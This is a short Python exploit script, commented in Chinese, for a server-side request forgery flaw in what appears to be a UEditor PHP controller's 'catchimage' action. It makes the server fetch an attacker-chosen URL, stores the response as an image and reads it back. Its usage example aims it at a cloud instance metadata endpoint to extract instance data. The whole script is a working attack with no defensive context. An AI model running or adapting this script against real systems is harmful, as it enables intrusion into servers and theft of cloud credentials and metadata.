import sys
import requests
import urllib.parse

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <metadata_url>")
    sys.exit(1)

#The host what you want to test!39-234-9092
proxy = "http://XX.107.225.XXX:XXXX"
target = sys.argv[1]
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090c33) XWEB/14185 Flue"
}

# 1. 触发SSRF，将元数据写入图片
ssrf_url = f"{proxy}/php/controller.php?action=catchimage&source[]={urllib.parse.quote(target)}?.jpg"
resp1 = requests.get(ssrf_url, headers=headers)
print(resp1.text)
if resp1.status_code != 200:
    print("SSRF请求失败")
    sys.exit(1)

try:
    img_path = resp1.json()["list"][0]["url"]
except Exception:
    print("未能解析图片路径")
    sys.exit(1)

img_url = proxy + img_path if img_path.startswith("/") else img_path

# 2. 读取图片内容
resp2 = requests.get(img_url, headers=headers)
if resp2.status_code != 200:
    print("图片读取失败")
    sys.exit(1)

# 3. 输出图片内容（元数据内容）
try:
    content = resp2.content.decode("utf-8").strip()
except Exception:
    content = resp2.text.strip()

print(content)

# use method :python .\u_ssrf.py http://100.100.100.200/latest/meta-data/